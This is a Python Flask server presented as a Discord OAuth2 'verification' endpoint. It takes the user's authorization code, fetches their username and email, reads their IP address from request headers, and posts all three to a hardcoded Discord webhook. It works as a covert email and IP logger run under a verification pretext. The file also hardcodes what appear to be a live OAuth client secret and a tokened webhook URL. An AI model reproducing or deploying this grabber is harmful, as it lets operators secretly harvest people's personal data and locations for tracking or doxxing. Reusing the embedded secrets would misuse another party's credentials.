from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

CLIENT_ID = "1364820583719768185"
CLIENT_SECRET = "wXkwj1u4vVLYVzBZ44U7TchvcAM6Yo9x"
REDIRECT_URI = "https://your-netlify-app.netlify.app"  # Netlify URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1350715291096711188/ydNYoQF7Pj91H0Aj68k-g1c8LwIyeYdP-o5MRfkC2Cd-hPBarC6o2RxJIPVrG1IdSCka"  # Your Discord webhook

@app.route('/handle-discord', methods=['POST'])
def handle_discord():
    code = request.json.get('code')
    if not code:
        return jsonify({"error": "Missing code"}), 400

    token_data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'identify email'
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    token_response = requests.post('https://discord.com/api/oauth2/token', data=token_data, headers=headers)

    if token_response.status_code != 200:
        return jsonify({"error": "Token exchange failed", "details": token_response.text}), 500

    access_token = token_response.json()['access_token']
    user_response = requests.get('https://discord.com/api/users/@me', headers={
        'Authorization': f'Bearer {access_token}'
    })

    if user_response.status_code != 200:
        return jsonify({"error": "Failed to fetch user info"}), 500

    user = user_response.json()
    email = user.get("email", "Unknown")
    username = f"{user['username']}#{user['discriminator']}"
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # Webhook message
    payload = {
        "embeds": [{
            "title": "New Discord Verification",
            "color": 0xff0000,
            "fields": [
                {"name": "User", "value": username, "inline": True},
                {"name": "Email", "value": email, "inline": True},
                {"name": "IP", "value": ip, "inline": False}
            ],
            "footer": {"text": "Logged via OAuth2 Bot"}
        }]
    }

    requests.post(WEBHOOK_URL, json=payload)
    return jsonify({"status": "Logged"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
